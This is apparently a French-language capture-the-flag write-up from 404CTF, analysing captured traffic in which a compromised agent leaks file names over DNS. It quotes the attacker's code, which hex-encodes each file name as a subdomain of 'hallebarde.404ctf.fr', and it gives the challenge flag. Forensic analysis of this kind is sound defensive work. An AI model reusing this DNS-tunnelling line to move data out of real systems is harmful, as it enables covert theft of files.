En lisant le fichier python on remarque que l'agent compromis effectue uniquement des requetes DNS.

On peut donc avec Wireshark filtrer uniquement les requetes DNS.

En annaltsant plus loin ~~on~~ remarque que il commence toujours par

`dns.resolver.resolve("never-gonna-give-you-up.hallebarde.404ctf.fr")`

avant d'effectuer : 

`dns.resolver.resolve(binascii.hexlify(filename.encode()).decode() + ".hallebarde.404ctf.fr")`

donc en cherchant tout les paquets qui commencent par ‘never....’ on peut trouver dans les requetes qui suivent le nom des fichires extraits .

on peut les lister et après les avoir traduit avec la fonction unhexlify de binascii on trouve : 

- exfiltration.py
- flag.txt
- hallebarde.png
- super-secret.pdf

donc le flag est : 

>404CTF{exfiltration.py,flag.txt,hallebarde.png,super-secret.pdf}